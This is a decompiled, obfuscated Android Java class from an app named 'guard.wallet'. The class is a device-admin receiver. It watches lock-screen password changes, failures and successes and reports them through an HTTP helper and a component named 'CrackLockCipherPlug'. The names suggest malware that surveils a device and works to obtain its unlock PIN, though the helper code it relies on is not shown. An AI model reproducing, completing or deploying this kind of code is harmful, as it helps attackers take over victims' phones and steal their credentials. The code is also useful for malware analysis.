package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.helper.AbstractC0195r;
import com.guard.wallet.http.AbstractC0207l;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Objects;

/* loaded from: classes.dex */
public class CustomAdminReceiver extends DeviceAdminReceiver {

    /* renamed from: a */
    public static final /* synthetic */ int f279a = 0;

    /* renamed from: a */
    public static void m457a() {
        DeviceAdminVO C0 = AbstractC0251g.C0();
        MessageRecordVO messageRecordVO = new MessageRecordVO();
        messageRecordVO.setExtraBody(C0);
        messageRecordVO.setIntentCode(Objects.equals(C0.getIsAdminActive(), 1) ? "android.app.action.DEVICE_ADMIN_ENABLED" : "android.app.action.DEVICE_ADMIN_DISABLED");
        Log.d("CustomAdminReceiver", C0.toString());
        if (MainApplication.getInstance() == null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
            return;
        }
        MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        m457a();
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        m457a();
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onLockTaskModeEntering(Context context, Intent intent, String str) {
        super.onLockTaskModeEntering(context, intent, str);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onLockTaskModeEntering");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onLockTaskModeExiting(Context context, Intent intent) {
        super.onLockTaskModeExiting(context, intent);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onLockTaskModeExiting");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordChanged(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordChanged(context, intent, userHandle);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordChanged");
        AbstractC0252h.m686G("android.intent.action.DEVICE_PASSWORD_CHANGED");
        synchronized (ReqUnlockDeviceVO.class) {
            AbstractC0252h.m719w("deviceCipher");
        }
        synchronized (ReqUnlockDeviceVO.class) {
            AbstractC0252h.m719w("deviceCipherLocked");
        }
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordExpiring(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordExpiring(context, intent, userHandle);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordExpiring");
        AbstractC0252h.m686G("android.intent.action.DEVICE_PASSWORD_EXPIRED");
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordFailed(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordFailed(context, intent, userHandle);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordFailed");
        AbstractC0252h.m686G("android.intent.action.DEVICE_PASSWORD_FAILED");
        if (AbstractC0251g.p0()) {
            AbstractC0252h.m683D(Long.valueOf(ScreenBroadcastReceiver.f283b.m723a()), "lockBatchId");
        }
        String m708l = AbstractC0252h.m708l("lockSubscribeId");
        if (!AbstractC0026q.m151B(m708l) && AbstractC0251g.p0()) {
            AbstractC0207l.m426i(new ReqListenHelper(m708l, 5));
        }
        if (MainApplication.getInstance() == null || MainApplication.getInstance().getCrackLockCipherPlug() == null) {
            return;
        }
        MainApplication.getInstance().getCrackLockCipherPlug().getClass();
        Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clearError");
        C0224c.f261a.clear();
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public final void onPasswordSucceeded(Context context, Intent intent, UserHandle userHandle) {
        super.onPasswordSucceeded(context, intent, userHandle);
        Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordSucceeded");
        if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
            MainApplication.getInstance().getCrackLockCipherPlug().getClass();
            C0224c.m451g();
        }
        if (AbstractC0195r.m382k()) {
            AbstractC0195r.m378g(true);
        }
        if (AbstractC0192o.m368i() || AbstractC0192o.m367h()) {
            AbstractC0192o.m365f(null, true);
        }
    }
}
